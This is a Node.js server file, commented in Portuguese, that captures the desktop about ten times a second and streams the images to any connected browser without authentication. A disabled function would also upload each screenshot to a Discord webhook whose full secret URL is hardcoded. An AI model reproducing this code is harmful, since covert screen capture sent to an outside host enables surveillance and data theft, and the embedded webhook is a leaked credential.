const express = require('express');
const app = express();
const server = require('http').Server(app);
const io = require('socket.io')(server);
const screenshot = require('desktop-screenshot');
const fs = require('fs').promises;
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1315397327585804318/_zv_ofFx49NtI-GDPRB4GUjWGugu28_XVMtk2eh52ly9HFsMJ2gTkZukGD2p8ZI6dses';

// Configuração do servidor
app.use(express.static('public'));

// Rota principal
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Função para gerar nome único para o arquivo
function getUniqueFileName() {
    return path.join(__dirname, `screenshot_${Date.now()}.png`);
}

// Função para capturar a tela
async function captureScreen() {
    const filename = getUniqueFileName();
    
    try {
        // Captura a tela
        await new Promise((resolve, reject) => {
            screenshot(filename, (error, complete) => {
                if (error) reject(error);
                else resolve();
            });
        });

        // Lê o arquivo
        const imageBuffer = await fs.readFile(filename);
        
        // Remove o arquivo temporário
        try {
            await fs.unlink(filename);
        } catch (unlinkError) {
            console.log('Arquivo já removido ou inacessível:', unlinkError.message);
        }
        
        return imageBuffer;
    } catch (error) {
        console.error('Erro ao capturar tela:', error);
        // Tenta limpar o arquivo em caso de erro
        try {
            await fs.unlink(filename);
        } catch (unlinkError) {
            // Ignora erro de remoção
        }
        return null;
    }
}

// Função para enviar para o Discord
async function sendToDiscord(imageBuffer) {
    try {
        const formData = new FormData();
        formData.append('file', imageBuffer, {
            filename: 'screenshot.png',
            contentType: 'image/png'
        });

        await axios.post(WEBHOOK_URL, formData, {
            headers: {
                ...formData.getHeaders(),
            }
        });
    } catch (error) {
        console.error('Erro ao enviar para Discord:', error);
    }
}

// Conexão WebSocket para o cliente web
io.on('connection', (socket) => {
    console.log('Cliente conectado');
    let lastCaptureTime = 0;
    
    // Inicia a captura contínua da tela
    const screenInterval = setInterval(async () => {
        const now = Date.now();
        // Garante um intervalo mínimo entre capturas
        if (now - lastCaptureTime < 50) return;
        
        lastCaptureTime = now;
        const imageBuffer = await captureScreen();
        if (imageBuffer) {
            // Envia para o cliente web
            socket.emit('screen-data', imageBuffer.toString('base64'));
            // Envia para o Discord
            /* await sendToDiscord(imageBuffer); */
        }
    }, 100);
    
    socket.on('disconnect', () => {
        clearInterval(screenInterval);
        console.log('Cliente desconectado');
    });
});

// Inicia o servidor
server.listen(1000, () => {
    console.log('Servidor rodando em http://localhost:1000');
}); 